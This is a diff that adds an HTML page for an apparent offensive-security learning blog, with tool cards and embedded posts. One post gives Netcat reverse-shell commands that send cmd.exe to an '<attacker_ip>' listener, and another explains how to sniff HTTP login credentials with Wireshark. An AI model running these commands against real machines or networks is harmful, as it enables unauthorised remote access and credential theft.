@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Learn offensive security and stay updated with the latest cybersecurity tools and techniques.">
+    <title>Hack the Grid</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Disclaimer Banner -->
+    <div class="bg-warning text-center py-2 fixed-banner">
+        <p class="m-0 fw-bold">
+            DISCLAIMER: All information provided on this website is for educational purposes only. The author will have no responsibility for any misuse of the content provided.
+        </p>
+    </div>
+
+    <!-- Fixed Navigation Header -->
+    <header class="bg-dark text-white py-3 fixed-header">
+        <div class="container d-flex justify-content-between align-items-center">
+            <h1 class="h3 m-0">Hack the Grid</h1>
+            <nav>
+                <ul class="nav">
+                    <li class="nav-item"><a href="#home" class="nav-link text-white">Home</a></li>
+                    <li class="nav-item"><a href="#blog" class="nav-link text-white active">Blog</a></li>
+                    <li class="nav-item"><a href="#tools" class="nav-link text-white">Tools</a></li>
+                    <li class="nav-item"><a href="#about" class="nav-link text-white">About</a></li>
+                    <li class="nav-item"><a href="#contact" class="nav-link text-white">Contact</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Home Section -->
+    <section id="home" class="py-5">
+        <div class="container text-center">
+            <h2>Welcome to Hack the Grid</h2>
+            <p>Your go-to resource for cybersecurity, offensive security, and penetration testing knowledge.</p>
+        </div>
+    </section>
+
+    <!-- Blog Section -->
+    <section id="blog" class="py-5">
+        <div class="container">
+            <h2 class="mb-4 text-center">Latest Posts</h2>
+            <div class="d-flex justify-content-center mb-4">
+                <select id="categoryFilter" class="form-select w-50" onchange="filterPosts()">
+                    <option value="all">All Categories</option>
+                    <option value="pentesting">Penetration Testing</option>
+                    <option value="tools">Tools</option>
+                    <option value="exploits">Exploits</option>
+                </select>
+            </div>
+            <div id="postContainer" class="row g-4">
+                <!-- Posts will be dynamically loaded here -->
+            </div>
+        </div>
+    </section>
+
+    <!-- Tools Section -->
+    <section id="tools" class="py-5 bg-light">
+        <div class="container">
+            <h2 class="text-center mb-4">Cybersecurity Tools</h2>
+            <div class="row g-4">
+                <!-- Tool 1 -->
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-body">
+                            <h5 class="card-title">Nmap</h5>
+                            <p class="card-text">Nmap (Network Mapper) is a powerful tool used for network discovery and vulnerability scanning. It helps identify open ports, services, and potential weaknesses on systems.</p>
+                            <a href="https://nmap.org/" target="_blank" class="btn btn-primary">Learn More</a>
+                        </div>
+                    </div>
+                </div>
+                <!-- Tool 2 -->
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-body">
+                            <h5 class="card-title">Wireshark</h5>
+                            <p class="card-text">Wireshark is a popular packet analyzer used for network troubleshooting, analysis, and capturing packets for deeper inspection.</p>
+                            <a href="https://www.wireshark.org/" target="_blank" class="btn btn-primary">Learn More</a>
+                        </div>
+                    </div>
+                </div>
+                <!-- Tool 3 -->
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-body">
+                            <h5 class="card-title">Metasploit</h5>
+                            <p class="card-text">Metasploit is a framework for developing and executing exploit code against a remote target machine. It's widely used for penetration testing and ethical hacking.</p>
+                            <a href="https://www.metasploit.com/" target="_blank" class="btn btn-primary">Learn More</a>
+                        </div>
+                    </div>
+                </div>
+                <!-- Tool 4 -->
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-body">
+                            <h5 class="card-title">Burp Suite</h5>
+                            <p class="card-text">Burp Suite is a web vulnerability scanner and proxy tool used for testing the security of web applications, including identifying common vulnerabilities like SQL Injection.</p>
+                            <a href="https://portswigger.net/burp" target="_blank" class="btn btn-primary">Learn More</a>
+                        </div>
+                    </div>
+                </div>
+                <!-- Tool 5 -->
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-body">
+                            <h5 class="card-title">John the Ripper</h5>
+                            <p class="card-text">John the Ripper is a password cracking tool that uses dictionary attacks, brute force, and customizable methods to test password strength.</p>
+                            <a href="https://www.openwall.com/john/" target="_blank" class="btn btn-primary">Learn More</a>
+                        </div>
+                    </div>
+                </div>
+                <!-- Tool 6 -->
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-body">
+                            <h5 class="card-title">Hydra</h5>
+                            <p class="card-text">Hydra is a fast and flexible password-cracking tool that supports numerous protocols like FTP, SSH, HTTP, and more, commonly used for brute force attacks.</p>
+                            <a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" class="btn btn-primary">Learn More</a>
+                        </div>
+                    </div>
+                </div>
+                <!-- Tool 7 -->
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-body">
+                            <h5 class="card-title">Kali Linux</h5>
+                            <p class="card-text">Kali Linux is a Linux distribution specifically designed for penetration testing, ethical hacking, and network security assessments. It comes preloaded with many tools.</p>
+                            <a href="https://www.kali.org/" target="_blank" class="btn btn-primary">Learn More</a>
+                        </div>
+                    </div>
+                </div>
+                <!-- Tool 8 -->
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-body">
+                            <h5 class="card-title">SQLmap</h5>
+                            <p class="card-text">SQLmap automates the process of detecting and exploiting SQL injection vulnerabilities, making it a valuable tool for testing database security.</p>
+                            <a href="http://sqlmap.org/" target="_blank" class="btn btn-primary">Learn More</a>
+                        </div>
+                    </div>
+                </div>
+                <!-- Tool 9 -->
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-body">
+                            <h5 class="card-title">Netcat</h5>
+                            <p class="card-text">Netcat is a versatile tool for networking and offensive security tasks, including creating reverse shells, transferring files, and port scanning.</p>
+                            <a href="https://nc110.sourceforge.io/" target="_blank" class="btn btn-primary">Learn More</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+
+    <!-- About Section -->
+    <section id="about" class="py-5">
+        <div class="container text-center">
+            <h2>About Hack the Grid</h2>
+            <p>Hack the Grid is dedicated to providing high-quality cybersecurity knowledge, tips, and resources for professionals and enthusiasts.</p>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section id="contact" class="py-5 bg-light">
+        <div class="container text-center">
+            <h2>Contact Us</h2>
+            <p>Have questions? Reach out to us at <a href="mailto:wdanielsson70@gmail.com">wdanielsson70@gmail.com</a>.</p>
+        </div>
+    </section>
+
+    <!-- Modal for Expanded Post -->
+    <div class="modal fade" id="postModal" tabindex="-1" aria-labelledby="postModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered modal-fullscreen">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="postModalLabel"></h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <div id="postContent" class="content-container">
+                        <!-- Dynamically loaded content goes here -->
+                    </div>
+                    <div class="text-center mt-3">
+                        <small class="text-muted">Category: <span id="postCategory"></span></small><br>
+                        <small class="text-muted">Published on: <span id="postDate"></span></small>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <footer class="bg-dark text-white py-4">
+        <div class="container text-center">
+            <p class="mb-2">&copy; 2024 Hack the Grid. All rights reserved.</p>
+            <ul class="nav justify-content-center">
+                <li class="nav-item"><a href="#" class="nav-link text-white">Twitter</a></li>
+                <li class="nav-item"><a href="#" class="nav-link text-white">LinkedIn</a></li>
+            </ul>
+        </div>
+    </footer>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Custom JS -->
+    <script>
+        // Example posts data with proper HTML for formatting
+        const posts = [
+            {
+                id: 1,
+                title: "Creating reverse shells with Netcat",
+                content: `
+                    <p>Netcat is a networking tool that can be used to create reverse shells, transfer files, and more. In this post, we'll look at how to create a reverse shell (from Windows to Windows) using Netcat.</p>
+                    <img src="https://via.placeholder.com/600x300" alt="Netcat Example" class="img-fluid mb-3">
+             
+                    <p>First we need to set up the listener on the attacker machine:</p>
+                    <pre><code>nc -lvp 4444</code></pre>
+                    
+                    <p>Next, we need to connect to the listener from the victim machine:</p>
+                    <pre><code>nc &lt;attacker_ip&gt; 4444 -e cmd.exe</code></pre>
+                    
+                    <p>After running the above command on the victim machine, you should see a new shell open on the attacker machine.</p>
+                    <h3>Possible Issues:</h3>
+                    <ul>
+                        <li>Firewall blocking the connection, the attacker machine should allow incoming connections on the specified port.</li>
+                        <li>Antivirus detecting the connection, a reverse shell is a common technique used by attackers and therefore its likely to be detected easily.</li>
+                    </ul>
+                `,
+                category: "pentesting",
+                date: "2024-11-17"
+            },
+            {
+                id: 2,
+                title: "Using Wireshark for HTTP password packet sniffing",
+                content: `
+                    <p>Wireshark is a powerful tool that can be used to sniff packets on a network. In this post, we'll look at how to use Wireshark to sniff HTTP packets and extract passwords.</p>
+                    <img src="https://www.unixmen.com/wp-content/uploads/2013/04/netcat_180.png" alt="Wireshark Interface" class="img-fluid mb-3">
+            
+                    <p>First, start Wireshark and begin capturing packets on the desired interface. You can use the following display filter to only show HTTP traffic:</p>
+                    <pre><code>http</code></pre>
+
+                    <p>You could also use the following filter to search for POST requests which typically contain login credentials:</p>
+                    <pre><code>http.request.method == "POST"</code></pre>
+
+                    <h3>Try it yourself:</h3>
+                    <p>1. Open Wireshark and start capturing packets.</p>
+                    <p>2. Configure wireshark to capture only HTTP traffic and HTTP post requests by using the display filter <code>http && http.request.method == "POST"</code>.</p>
+                    <p>3. Visit a HTTP website that requires authentication (e.g., <a href="http://testphp.vulnweb.com/login.php">testphp.vulnweb.com</a>) and log in.</p>
+                    <p>4. Stop the packet capture and search for the POST request containing the username and password (Typically under HTML Form URL Encoded).</p>
+                    <p>Could look something like this:</p>
+                    <pre><code>HTML Form URL Encoded: application/x-www-form-urlencoded
+Form item: "uname" = "admin"
+Form item: "pass" = "mypassword123"</code></pre>
+
+                    <p>If you successfully found your credentials, then congratulations! You've successfully sniffed HTTP packets with Wireshark.</p>
+
+                    <h3>Possible Issues:</h3>
+                    <ul>
+                        <li>HTTPS traffic is encrypted and cannot be sniffed in plaintext.</li>
+                        <li>You have to be on the same network as the victim to sniff their packets.</li>
+                    </ul>
+                `,
+                category: "pentesting",
+                date: "2024-11-17"
+            },
+            {
+                id: 3,
+                title: "Wireless Pentesting Basics",
+                content: "<p>An introduction to wireless penetration testing techniques and tools...</p>",
+                category: "pentesting",
+                date: "2024-11-10"
+            },
+            {
+                id: 4,
+                title: "Exploiting Buffer Overflows",
+                content: "<p>Step-by-step guide to understanding and exploiting buffer overflow vulnerabilities...</p>",
+                category: "exploits",
+                date: "2024-11-12"
+            }
+        ];
+
+        // Function to render posts
+        function renderPosts(filteredPosts) {
+            const container = document.getElementById("postContainer");
+            container.innerHTML = ""; // Clear previous posts
+            filteredPosts.forEach(post => {
+                const postCard = `
+                    <div class="col-md-4">
+                        <div class="card" onclick="openPostModal(${post.id})" style="cursor: pointer;">
+                            <div class="card-body">
+                                <h5 class="card-title">${post.title}</h5>
+                                <p class="card-text">${post.content.substring(0, 100)}...</p>
+                                <small class="text-muted">Category: ${post.category}</small><br>
+                                <small class="text-muted">Published on: ${post.date}</small>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                container.innerHTML += postCard;
+            });
+        }
+
+        // Function to open a post in a modal
+        function openPostModal(postId) {
+            const post = posts.find(p => p.id === postId);
+            document.getElementById("postModalLabel").textContent = post.title;
+            document.getElementById("postContent").innerHTML = post.content; // Use innerHTML for rich content
+            document.getElementById("postCategory").textContent = post.category;
+            document.getElementById("postDate").textContent = post.date;
+            const modal = new bootstrap.Modal(document.getElementById("postModal"));
+            modal.show();
+        }
+
+        // Function to filter posts by category
+        function filterPosts() {
+            const selectedCategory = document.getElementById("categoryFilter").value;
+            const filteredPosts = selectedCategory === "all"
+                ? posts // Show all posts if "All Categories" is selected
+                : posts.filter(post => post.category === selectedCategory); // Filter posts by selected category
+            renderPosts(filteredPosts); // Re-render the posts with the filtered list
+        }
+
+        // Initial render of all posts
+        document.addEventListener("DOMContentLoaded", () => {
+            renderPosts(posts);
+        });
+       
+    </script>
+</body>
+</html>
